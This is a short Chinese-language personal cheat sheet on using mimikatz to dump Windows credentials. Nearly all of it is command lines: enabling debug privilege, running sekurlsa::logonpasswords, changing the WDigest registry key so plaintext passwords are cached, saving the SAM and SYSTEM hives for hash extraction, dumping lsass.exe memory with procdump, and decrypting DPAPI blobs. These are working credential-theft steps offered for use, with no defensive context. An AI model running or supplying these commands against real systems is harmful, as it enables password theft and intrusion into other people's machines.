# mimikatz

mimikatz可以获取windows内存中的用户密码，需要管理员权限运行，注意选择相应系统的位数  
github地址: https://github.com/gentilkiwi/mimikatz  

注：所有能获取密码的操作都在win7x64下实测可行，在win10不行  


## `基本使用`
```r
# 提升权限
privilege::debug

# 抓取密码
sekurlsa::logonpasswords
```

命令写成一行，输出重定向：  
`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" > log.txt`  
执行之后 `Ctrl+C` 就好了  

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文  
`reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`  
重启或用户重新登录后可以成功抓取(&&&&&&& 测试未成功)  


## `通过SAM获取hash`
只能获取hash，不能获取密码  
```r
#导出SAM数据
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM

#使用mimikatz提取hash
lsadump::sam /sam:SAM /system:SYSTEM
```


## `通过dump文件提取密码`
使用procdump生成dump文件：  
`procdump64.exe -accepteula -ma lsass.exe lsass.dmp`  
使用mimikatz提取密码：  
`mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" > pssword.txt`  


## `从dump文件获取凭证解密数据`
以前记的笔记，忘了具体什么场景了  
```r
# 从dump文件获取凭证, 解密数据
mimikatz.exe "sekurlsa::minidump mini.dmp" "sekurlsa::dpapi" "dpapi::blob /in:pass.txt" > log.txt
```

参考链接：  
1. https://www.cnblogs.com/-mo-/p/11890232.html
2. https://www.cnblogs.com/ldhbetter/p/9391913.html

基本是摘抄的，没原创  


2021/9/17  
